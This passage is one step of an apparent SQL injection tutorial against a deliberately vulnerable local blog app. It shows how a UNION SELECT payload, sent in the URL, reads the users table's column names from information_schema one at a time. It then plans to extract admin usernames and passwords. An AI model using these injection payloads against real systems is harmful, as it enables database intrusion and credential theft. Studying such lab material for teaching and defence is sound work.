# (f) Get columns of users table

The plan here is to **list all the columns** of the table **users**, where we think is all the information (username, password, etc) about users.

The [information_schema](http://dev.mysql.com/doc/refman/5.7/en/information-schema.html) database we discussed in the previous steps also store information about all the columns in every table of every database.

This information is stored in a table called **COLUMNS**.

So, to get all the columns of our target table we have to query that *COLUMNS* table, like this:
```shell
SELECT column_name FROM information_schema.columns WHERE table_schema='insecure_blog' AND table_name='users' LIMIT 1 OFFSET 0
```

> **Note #1:**
>
> Remember the **information_schema.columns** structure? Take a look:
>
> | TABLE_SCHEMA  | TABLE_NAME    | COLUMN_NAME  |
> | ------------- |:-------------:| ------------:|
> | insecure_blog | users         | id           |
> | insecure_blog | users         | username     |
> | insecure_blog | users         | firstname    |
> | insecure_blog | users         | lastname     |
> | insecure_blog | users         | avatar       |
> 
> We are quering the **COLUMN_NAME**


Just like before we inject the query in the browser:
```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT column_name FROM information_schema.columns WHERE table_schema='insecure_blog' AND table_name='users' LIMIT 1 OFFSET 0),3,4,5,6,7,8,9,10/slug-name-post'
```

And keep **increasing the OFFSET** value to get all the columns.


> **Note #2:**
>
> Remember that we use **LIMIT** and **OFFSET** for listing one column at a time, avoiding errors


--

If all went well, we will have 8 columns:

- id
- username
- password
- isAdmin
- firstname
- lastname
- avatar
- description

**isAdmin** looks like a column with a boolean value. 
One could guess that all *Administrator users* will have this field set to **true** or **1**.

So next step will be getting all users with **_isAdmin=true_** and then getting their **_usernames_** and **_passwords_**.